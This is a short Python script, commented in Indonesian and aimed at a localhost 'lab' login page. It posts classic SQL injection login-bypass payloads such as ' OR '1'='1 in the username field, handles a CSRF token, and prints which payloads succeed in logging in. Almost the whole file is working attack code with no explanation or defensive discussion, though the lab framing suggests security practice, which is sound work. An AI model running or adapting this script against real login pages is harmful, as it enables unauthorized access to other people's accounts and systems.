import requests
from bs4 import BeautifulSoup

# ===== Konfigurasi =====
url = "http://localhost:8080/index.php/login"  # URL login lab
username_field = "username"                    # ganti sesuai lab
password_field = "password"                    # ganti sesuai lab
success_text = "Login successful"             # teks yang muncul saat login berhasil
password = "password"                          # password tetap untuk testing
payloads = ["' OR '1'='1", "' OR '1'='2", "' OR ''='"]

# ===== Mulai sesi =====
session = requests.Session()

# Optional: ambil halaman login dulu (untuk token/cookie)
r = session.get(url)
soup = BeautifulSoup(r.text, "html.parser")

# Jika ada CSRF token, ambil dari input hidden bernama csrf_token (ubah sesuai lab)
csrf_token_input = soup.find("input", {"name": "csrf_token"})
csrf_token = csrf_token_input["value"] if csrf_token_input else None

# ===== Test payloads =====
for payload in payloads:
    data = {
        username_field: payload,
        password_field: password
    }
    if csrf_token:
        data["csrf_token"] = csrf_token

    response = session.post(url, data=data)

    if success_text in response.text:
        print(f"[+] Payload berhasil: {payload}")
    else:
        print(f"[-] Payload gagal: {payload}")
